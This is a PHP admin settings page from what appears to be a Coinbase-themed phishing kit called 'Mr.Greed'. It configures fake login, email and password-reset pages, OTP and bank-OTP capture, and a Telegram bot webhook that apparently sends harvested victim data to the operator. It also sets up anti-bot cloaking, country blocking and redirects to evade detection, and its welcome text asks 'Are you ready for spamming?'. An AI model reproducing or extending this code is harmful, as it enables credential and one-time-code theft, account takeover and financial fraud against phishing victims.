<?php
error_reporting(E_ALL);
session_start();
require_once('../function/settings.php');
$Sett = new Coinbasah();
if(empty($_COOKIE['panel']) || $_COOKIE['panel'] !== 'true'){
    header("Location: ../xyz");
    exit;
}

$json_data = file_get_contents('../function/config.json');
$data = json_decode($json_data, true);
$blockCountryS = str_replace(["[", "]", "'"], "", $data['BlockCountry']);
// Checker block
if($data['antibotStatus'] != 'on' || $data['IQSStatus'] != 'on' || $data['StopbotStatus'] != 'on'){
    $StatusOff = 'on';
}else{
    $StatusOff = '';
}
if($data['antibotStatus'] === 'on'){
    $PrivateKey = $data['antibot'];
}elseif($data['IQSStatus'] === 'on'){
    $PrivateKey = $data['ipQuality'];
}elseif($data['StopbotStatus'] === 'on'){
    $PrivateKey = $data['stopbotkey'];
}else{
    $PrivateKey = '';
}
$path = 'https://' . $_SERVER['SERVER_NAME'] . '/xyz';
$web = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$pages = explode("/", $web);

if(isset($_POST['save'])){
    $Sett->SettingsPanel();
}

if(isset($_POST['logout'])){
    setcookie('panel', '', time() - 3600, "/"); // Expire the cookie by setting it in the past
    header("Location: ?Logout");
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <!--  Title -->
    <title>Panel Mr.Greed</title>
    <!--  Required Meta Tag -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="handheldfriendly" content="true" />
    <meta name="MobileOptimized" content="width" />
    <meta name="description" content="Mordenize" />
    <meta name="author" content="" />
    <meta name="keywords" content="Mordenize" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!--  Favicon -->
    <link rel="shortcut icon" type="image/png" href="../assets/images/title.png" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>

    <!-- Core Css -->
    <link id="themeColors" rel="stylesheet" href="../assets/css/style.min.css" />
    <style>
        .btn-block {
            display: block;
            width: 100%;
        }
    </style>
</head>

<body>
    <!-- Preloader -->
    <div class="preloader">
        <img src="../assets/images/title.png" alt="loader" class="lds-ripple img-fluid" />
    </div>
    <!-- Preloader -->
    <div class="preloader">
        <img src="../assets/images/title.png" alt="loader" class="lds-ripple img-fluid" />
    </div>
    <!--  Body Wrapper -->
    <div class="page-wrapper" id="main-wrapper" data-theme="blue_theme" data-layout="vertical" data-sidebartype="full" data-sidebar-position="fixed" data-header-position="fixed">
        <!-- Sidebar Start -->
        <aside class="left-sidebar">
            <!-- Sidebar scroll-->
            <div>
                <div class="brand-logo d-flex align-items-center justify-content-between">
                    <a href="<?= $path; ?>dashboard" class="text-nowrap logo-img">
                        <div class="light-logo container">
                            <h3 class="text-white text-uppercase">Mr.Greed</h3>
                        </div>
                        <div class="dark-logo container">
                            <h3 class="text-dark text-uppercase">Mr.Greed</h3>
                        </div>
                    </a>
                    <div class="close-btn d-lg-none d-block sidebartoggler cursor-pointer" id="sidebarCollapse">
                        <i class="ti ti-x fs-8"></i>
                    </div>
                </div>
                <!-- Sidebar navigation-->
                <nav class="sidebar-nav scroll-sidebar" data-simplebar>
                    <ul id="sidebarnav">
                        <!-- ============================= -->
                        <!-- Home -->
                        <!-- ============================= -->
                        <li class="nav-small-cap">
                            <i class="ti ti-dots nav-small-cap-icon fs-4"></i>
                            <span class="hide-menu">Home</span>
                        </li>
                        <!-- =================== -->
                        <!-- Dashboard -->
                        <!-- =================== -->
                        <li class="sidebar-item">
                            <a class="sidebar-link" href="dashboard" aria-expanded="false">
                                <span>
                                    <i class="ti ti-home"></i>
                                </span>
                                <span class="hide-menu">Home</span>
                            </a>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" href="users" aria-expanded="false">
                                <span>
                                <i class="ti ti-users"></i>
                                </span>
                                <span class="hide-menu">Users</span>
                            </a>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" target="_blank" href="https://<?= $_SERVER['HTTP_HOST']; ?>/?<?= $data['parameter']; ?>" aria-expanded="false">
                                <span>
                                    <i class="ti ti-link"></i>
                                </span>
                                <span class="hide-menu">Visit Login</span>
                            </a>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" target="_blank" href="https://<?= $_SERVER['HTTP_HOST']; ?>/?code=contoh@gmail.com" aria-expanded="false">
                                <span>
                                    <i class="ti ti-link"></i>
                                </span>
                                <span class="hide-menu">Visit Email</span>
                            </a>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" target="_blank" href="https://<?= $_SERVER['HTTP_HOST']; ?>/?m=contoh@gmail.com" aria-expanded="false">
                                <span>
                                    <i class="ti ti-link"></i>
                                </span>
                                <span class="hide-menu">Forgot Password</span>
                            </a>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" href="listmark" aria-expanded="false">
                                <span>
                                <i class="ti ti-bookmark"></i>
                                </span>
                                <span class="hide-menu">List Mark</span>
                            </a>
                        </li>

                        <!-- ============================= -->
                        <!-- Apps -->
                        <!-- ============================= -->
                        <li class="nav-small-cap">
                            <i class="ti ti-dots nav-small-cap-icon fs-4"></i>
                            <span class="hide-menu">Settings</span>
                        </li>
                        <li class="sidebar-item">
                            <a class="sidebar-link" href="settings" aria-expanded="false">
                                <span>
                                    <i class="ti ti-settings"></i>
                                </span>
                                <span class="hide-menu">Settings</span>
                            </a>
                        </li>
                    </ul>
                </nav>
                <div class="fixed-profile p-3 bg-light-secondary rounded sidebar-ad mt-3">
                    <div class="hstack gap-3">
                        <div class="john-img">
                            <img src="../assets/images/users.jpg" class="rounded-circle" width="40" height="40" alt="" />
                        </div>
                        <div class="john-title">
                            <h6 class="mb-0 fs-4 fw-semibold">ADMIN</h6>
                            <span class="fs-2 text-dark">Mr.Greed</span>
                        </div>
                        <form method="post">
                            <button class="border-0 bg-transparent text-primary ms-auto" tabindex="0" type="submit" name="logout" aria-label="logout" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-title="logout">
                                <i class="ti ti-power fs-6"></i>
                            </button>
                        </form>
                    </div>
                </div>
                <!-- End Sidebar navigation -->
            </div>
            <!-- End Sidebar scroll-->
        </aside>
        <!--  Sidebar End -->
        <!--  Main wrapper -->
        <div class="body-wrapper">
            <!--  Header Start -->
            <header class="app-header">
                <nav class="navbar navbar-expand-lg navbar-light">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link sidebartoggler nav-icon-hover ms-n3" id="headerCollapse" href="javascript:void(0)">
                                <i class="ti ti-menu-2"></i>
                            </a>
                        </li>
                    </ul>
                </nav>
            </header>
            <!--  Header End -->
            <!-- Content -->
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12 d-flex align-items-stretch">
                        <div class="card w-100 bg-light-info overflow-hidden shadow-none">
                            <div class="card-body py-3">
                            <div class="row justify-content-between align-items-center">
                                <div class="col-sm-6">
                                <h5 class="card-title fw-semibold">Welcome To Mr.Greed Panel</h5>
                                <p class="mb-9"> Are you ready for spamming ? </p>
                                <div class="btn btn-primary fs-2">Time : <span class="text-danger fw-bold" id="dateTime"></div>
                                <div class="pt-2">
                                    <a class="btn btn-success" href="https://api.telegram.org/bot<?= $data['Userid']; ?>/setWebhook?url=https://<?= $_SERVER['SERVER_NAME']; ?>/function/webhook.php" target="_blank">Connect your Webhook</a>
                                </div>
                                </div>
                                <div class="col-sm-5">
                                <div class="position-relative mb-n7 text-end">
                                    <img src="../assets/images/welcome-bg2.png" alt="" class="img-fluid">
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-lg-12 d-flex align-items-strech">
                        <div class="card w-100">
                            <div class="card-body">
                                <div class="d-sm-flex d-block align-items-center justify-content-between mb-7">
                                    <div class="mb-3 mb-sm-0">
                                        <h2 class="card-title fw-semibold text-danger"><i class="ti ti-home-cog"></i> Settings</h2>
                                    </div>
                                </div>
                                <div class="card">
                    <form method="POST">
                        <div class="card-body">
                            <p class="card-subtitle mb-3">
                                This page is used to control the entire contents of the script 👿
                            </p>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="Password Panel" name="Password" value="<?= $data['password']; ?>">
                                <label><i class="ti ti-user me-2 fs-4"></i>Password</label>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="email" class="form-control" placeholder="Email" name="Email" value="<?= $data['email']; ?>">
                                <label><i class="ti ti-mail me-2 fs-4"></i>Email address</label>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="Parameter" name="Parameter" value="<?= $data['parameter']; ?>">
                                <label><i class="ti ti-lock me-2 fs-4"></i>Parameter</label>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="otpAttempt" name="otpAttempt" value="<?= $data['otpAttempt']; ?>">
                                <label><i class="ti ti-lock me-2 fs-4"></i>OTP Attempt</label>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="BankOTP" name="BankOTP" value="<?= $data['BankOTP']; ?>">
                                <label><i class="ti ti-lock me-2 fs-4"></i>Bank OTP</label>
                            </div>
                            <label>Blocker</label>
                            <div class="row mb-3">
                                <div class="col-lg-3">
                                    <select class="form-select col-12" id="inlineFormCustomSelect" name="Blocker">
                                        <option value="Off" <?php if($StatusOff === 'on'){echo "selected";} ?>>Off</option>
                                        <option value="Antibot" <?php if($data['antibotStatus'] === 'on'){echo "selected";} ?>>Antibot</option>
                                        <option value="Stopbot" <?php if($data['StopbotStatus'] === 'on'){echo "selected";} ?>>Stopbot</option>
                                        <option value="IpQualityScore" <?php if($data['IQSStatus'] === 'on'){echo "selected";} ?>>IpQualityScore</option>
                                    </select>
                                </div>
                                <div class="col-lg-9">
                                    <div class="form-floating mb-3">
                                        <input type="text" class="form-control" placeholder="AntiBot Key" name="PrivateKey" value="<?= $PrivateKey; ?>">
                                        <label><i class="ti ti-lock me-2 fs-4"></i>Private Key</label>
                                    </div>
                                </div>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="Redirect" name="Redirect" value="<?= $data['redirectblock']; ?>">
                                <label><i class="ti ti-air-balloon me-2 fs-4"></i>Redirect</label>
                            </div>
                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" placeholder="Redirect" name="BlockCountry" value="<?= $blockCountryS; ?>">
                                <label><i class="ti ti-flag me-2 fs-4"></i>Lock Country</label>
                                <span class="text-danger fs-2">*This feature only for Ipqualityscore</span>
                            </div>
                            <div class="p-3 rounded border mt-2">
                                <span class="text-dark">*Telegram Token Settings</span>
                                <div class="form-floating mb-3 mt-2">
                                    <input type="text" class="form-control" placeholder="BOT ID" name="Userid" value="<?= $data['Userid']; ?>">
                                    <label><i class="ti ti-flag me-2 fs-4"></i>BOT ID</label>
                                </div>
                                <div class="form-floating mb-3">
                                    <input type="text" class="form-control" placeholder="User ID" name="ChanelID" value="<?= $data['ChanelID']; ?>">
                                    <label><i class="ti ti-flag me-2 fs-4"></i>User ID</label>
                                </div>
                            </div>

                            <div class="pt-3 d-md-flex align-items-center">
                                <div class="mt-3 mt-md-0 ms-auto">
                                <button type="submit" class="btn btn-primary font-medium rounded-pill px-4" name="save">
                                    <div class="d-flex align-items-center">
                                    <i class="ti ti-send me-2 fs-4"></i>
                                    Save
                                    </div>
                                </button>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--  Customizer -->
        <button class="btn btn-primary p-3 rounded-circle d-flex align-items-center justify-content-center customizer-btn" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasExample" aria-controls="offcanvasExample">
            <i class="ti ti-settings fs-7" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-title="Settings"></i>
        </button>
        <div class="offcanvas offcanvas-end customizer" tabindex="-1" id="offcanvasExample" aria-labelledby="offcanvasExampleLabel" data-simplebar="">
            <div class="d-flex align-items-center justify-content-between p-3 border-bottom">
                <h4 class="offcanvas-title fw-semibold" id="offcanvasExampleLabel">
                    Settings
                </h4>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body p-4">
                <div class="theme-option pb-4">
                    <h6 class="fw-semibold fs-4 mb-1">Theme Option</h6>
                    <div class="d-flex align-items-center gap-3 my-3">
                        <a href="javascript:void(0)" onclick="toggleTheme('../assets/css/style.min.css')" class="rounded-2 p-9 customizer-box hover-img d-flex align-items-center gap-2 light-theme text-dark">
                            <i class="ti ti-brightness-up fs-7 text-primary"></i>
                            <span class="text-dark">Light</span>
                        </a>
                        <a href="javascript:void(0)" onclick="toggleTheme('../assets/css/style-dark.min.css')" class="rounded-2 p-9 customizer-box hover-img d-flex align-items-center gap-2 dark-theme text-dark">
                            <i class="ti ti-moon fs-7"></i>
                            <span class="text-dark">Dark</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <script>
            function updateDateTime() {
                const now = new Date();
                const formattedDateTime = now.toLocaleString('en-US', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: 'numeric',
                    minute: 'numeric',
                    timeZone: "Asia/Jakarta",
                    second: 'numeric',
                    hour12: true
                    
                });
                document.getElementById('dateTime').textContent = formattedDateTime;
            }

            // Initial call to display the date and time immediately when the page loads
            updateDateTime();

            // Update the date and time every second
            setInterval(updateDateTime, 1000);

        </script>
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/bootstrap.bundle.min.js"></script>
        <script src="../assets/js/custom.js"></script>
        <script src="../assets/js/app.min.js"></script>
        <script src="../assets/js/app.init.js"></script>
</body>

</html>